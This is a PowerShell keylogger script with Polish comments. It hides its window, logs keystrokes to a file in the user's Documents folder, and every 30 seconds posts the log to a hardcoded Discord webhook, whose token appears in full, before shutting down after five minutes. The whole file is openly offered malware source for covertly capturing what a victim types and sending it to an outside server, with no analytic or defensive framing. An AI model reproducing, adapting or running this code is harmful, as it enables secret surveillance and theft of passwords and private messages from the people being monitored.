Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Ścieżka do pliku logu
$logPath = "$env:USERPROFILE\Documents\keylogger.txt"

# Webhook Discorda
$webhook = "https://discord.com/api/webhooks/1360942823821803540/9I6AgpJboKwPSgnCIfbxFshdEwhYTyOHrlYrNlnY-UkJvc1SjTyAtEu-8-KEyWv3iCuU"

# Globalny bufor klawiszy
$global:loggedKeys = ""

# Funkcja zapisu logów
function Save-Log {
    $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
    $global:loggedKeys = ""
}

# Funkcja wysyłania na Discord
function Send-To-Discord {
    if (Test-Path $logPath) {
        $content = Get-Content $logPath -Raw
        if ($content.Trim().Length -gt 0) {
            $maxLen = 1900
            if ($content.Length -gt $maxLen) {
                $content = $content.Substring(0, $maxLen) + "`n[...]"
            }

            $payload = @{
                "content" = "📝 **Keylogger log:**`n```\n$content\n```"
            } | ConvertTo-Json -Depth 10

            try {
                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
                Clear-Content -Path $logPath
            } catch {
                Write-Host "❌ Błąd wysyłania na Discorda: $_"
            }
        }
    }
}

# Timer do wysyłania logów co 30s
$sendTimer = New-Object System.Timers.Timer
$sendTimer.Interval = 30000
$sendTimer.AutoReset = $true
$sendTimer.add_Elapsed({ Send-To-Discord })
$sendTimer.Start()

# Formularz do rejestracji klawiszy
$form = New-Object Windows.Forms.Form
$form.WindowState = "Minimized"
$form.ShowInTaskbar = $false
$form.Add_KeyDown({
    param($sender, $e)
    $key = $e.KeyCode.ToString()
    if ($e.Control -and $e.KeyCode -eq "C") { $key = "[Ctrl+C]" }
    $global:loggedKeys += $key + " "
    if ($global:loggedKeys.Length -gt 50) {
        Save-Log
    }
})

# Główny timer zamykający skrypt po 5 minutach
$shutdownTimer = New-Object System.Timers.Timer
$shutdownTimer.Interval = 300000  # 5 minut = 300 000 ms
$shutdownTimer.AutoReset = $false
$shutdownTimer.add_Elapsed({
    Save-Log
    Send-To-Discord
    $sendTimer.Stop()
    $shutdownTimer.Stop()
    $form.Close()
})
$shutdownTimer.Start()

# Start ukrytego formularza
$form.Add_Shown({ $form.Hide() })
[void]$form.ShowDialog()
